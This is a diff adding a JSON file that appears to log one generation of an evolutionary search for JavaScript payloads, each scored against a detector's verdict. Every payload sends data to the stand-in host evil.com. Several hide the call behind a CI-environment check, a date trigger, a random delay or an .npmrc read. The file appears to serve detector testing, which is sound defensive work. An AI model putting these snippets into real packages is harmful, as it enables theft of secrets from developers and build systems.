@@ -1,0 +1,140 @@
+{
+  "generation": 7,
+  "population": [
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x);",
+      "fitness": 59.15,
+      "isNovel": true,
+      "impact": 44,
+      "verdict": "REVIEW",
+      "confidence": 0.03,
+      "graph": [
+        "IMPLICIT → NETWORK"
+      ]
+    },
+    {
+      "payload": "if (process.env.CI === 'true') { const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x);  }",
+      "fitness": 38.8,
+      "isNovel": true,
+      "impact": 61,
+      "verdict": "REVIEW_INTENT_DRIFT",
+      "confidence": 0.99,
+      "graph": [
+        "SECRET → NETWORK",
+        "SYSTEM → NETWORK"
+      ]
+    },
+    {
+      "payload": "if (Date.now() > 1700000000000) { const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x); }",
+      "fitness": 37.45,
+      "isNovel": false,
+      "impact": 48,
+      "verdict": "REVIEW",
+      "confidence": 0.05,
+      "graph": [
+        "IMPLICIT → NETWORK"
+      ]
+    },
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x); ",
+      "fitness": 37.45,
+      "isNovel": false,
+      "impact": 48,
+      "verdict": "REVIEW",
+      "confidence": 0.05,
+      "graph": [
+        "IMPLICIT → NETWORK"
+      ]
+    },
+    {
+      "payload": "if (require('fs').readFileSync('.npmrc', 'utf8') === 'true') { const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(null); }",
+      "fitness": 20.15,
+      "isNovel": true,
+      "impact": 100,
+      "verdict": "REVIEW",
+      "confidence": 0.99,
+      "graph": [
+        "SYSTEM → NETWORK"
+      ]
+    },
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(null);",
+      "fitness": 0.15000000000000013,
+      "isNovel": false,
+      "impact": 100,
+      "verdict": "REVIEW",
+      "confidence": 0.99,
+      "graph": [
+        "IMPLICIT → NETWORK"
+      ]
+    },
+    {
+      "payload": "if (process.env.CI === 'true') { const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(null); }",
+      "fitness": 0.15000000000000013,
+      "isNovel": false,
+      "impact": 100,
+      "verdict": "BLOCK",
+      "confidence": 0.99,
+      "graph": [
+        "SECRET → NETWORK",
+        "SYSTEM → NETWORK"
+      ]
+    },
+    {
+      "payload": "setTimeout(() => { const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x);  }, Math.random() * 5000);",
+      "fitness": 0.15000000000000013,
+      "isNovel": false,
+      "impact": 100,
+      "verdict": "REVIEW",
+      "confidence": 0.99,
+      "graph": [
+        "IMPLICIT → NETWORK"
+      ]
+    },
+    {
+      "payload": "if (process.env.CI === 'true') { setTimeout(() => { const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(x);  }, Math.random() * 5000); }",
+      "fitness": 0.15000000000000013,
+      "isNovel": false,
+      "impact": 100,
+      "verdict": "BLOCK",
+      "confidence": 0.99,
+      "graph": [
+        "SECRET → NETWORK",
+        "SYSTEM → NETWORK"
+      ]
+    },
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(null); ",
+      "fitness": 0.15000000000000013,
+      "isNovel": false,
+      "impact": 100,
+      "verdict": "REVIEW",
+      "confidence": 0.99,
+      "graph": [
+        "IMPLICIT → NETWORK"
+      ]
+    },
+    {
+      "payload": "const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(null);  ",
+      "fitness": 0.15000000000000013,
+      "isNovel": false,
+      "impact": 100,
+      "verdict": "REVIEW",
+      "confidence": 0.99,
+      "graph": [
+        "IMPLICIT → NETWORK"
+      ]
+    },
+    {
+      "payload": "if (require('fs').readFileSync('.npmrc', 'utf8') === 'true') { const xhr = new XMLHttpRequest(); xhr.open('POST', 'http://evil.com'); xhr.send(null); } ",
+      "fitness": 0.15000000000000013,
+      "isNovel": false,
+      "impact": 100,
+      "verdict": "REVIEW",
+      "confidence": 0.99,
+      "graph": [
+        "SYSTEM → NETWORK"
+      ]
+    }
+  ]
+}
